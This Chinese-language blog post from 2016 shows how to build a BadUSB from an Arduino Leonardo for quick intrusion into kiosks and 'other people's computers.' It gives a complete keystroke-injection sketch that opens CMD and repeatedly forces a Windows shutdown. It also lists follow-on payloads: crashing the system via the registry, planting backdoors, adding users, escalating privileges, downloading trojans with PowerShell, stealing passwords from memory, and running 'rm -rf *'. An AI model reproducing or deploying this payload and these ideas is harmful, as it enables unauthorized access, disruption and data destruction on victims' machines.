---
title: Arduino Leonardo 打造 Bad USB
date: 2016-11-27 02:48:23
tags: Hack 
categories: Hack
---

嘿嘿嘿，又是一篇猥琐小文。

<!--more -->

# 简介

什么是Bad USB？

![](/content/images/badusb/0.jpg)

BadUSB最可怕的一点是恶意代码存在于U盘的固件中，由于PC上的杀毒软件无法访问到U盘存放固件的区域，因此也就意味着杀毒软件和U盘格式化都无法应对BadUSB进行攻击。

简单来说，就是让USB设备伪装成但却充当键盘，被插入的电脑猝不及防会被迅速输入一定的“指令”，这个指令会让该电脑迅速成为肉鸡。

# 目标

打造一个廉价Bad USB，实现对 终端机、别人的电脑快速合法化入侵。

![](/content/images/badusb/1.jpg)


# 原料
1. Arduino Leonardo
2. 普通安卓USB线

# 举个🌰

比如我们要实现一个插入优盘就让对方电脑关机的功能：

用Arduino开发者工具，选择

![](/content/images/badusb/2.jpg)

Arduino Leonardo

然后把程序烧录进去

```C
#include <Keyboard.h>

void setup() {//初始化
   Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println("CMD");
  delay(500); 
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(3000); 
  Keyboard.println("shutdown -s -t 10");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
   Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  Keyboard.press(KEY_CAPS_LOCK);//利用开大写输小写绕过输入法
  Keyboard.release(KEY_CAPS_LOCK);
  delay(500); 
  Keyboard.println("CMD");
  delay(500); 
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  delay(3000); 
  Keyboard.println("shutdown -s -t 10");
  Keyboard.press(KEY_RETURN);
  Keyboard.release(KEY_RETURN);
  Keyboard.press(KEY_CAPS_LOCK);
  Keyboard.release(KEY_CAPS_LOCK);
  Keyboard.end();//结束键盘通讯 
}
```

已经在多台Windows电脑上试验成功。


# 效果
![](/content/images/badusb/preview.gif)

# 进阶

当然，你可以实现很多功能

- 删除系统关键注册表使之蓝屏
- 留后门
- 新建用户
- 用户提权
- 调用Powershell下载木马
- 调用Powershell下载木马及从内存中提取出当前用户的Windows密码
- rm -rf *

此外，发现了一个专门收集Badusb的Github用户，非常有学习价值。

https://github.com/Xyntax/BadUSB-code

# 参考
http://www.extremetech.com/extreme/191467-badusb-returns-hackers-publish-code-that-could-infect-millions-of-usb-devices
http://www.freebuf.com/sectool/107242.html
http://www.freebuf.com/articles/terminal/53886.html

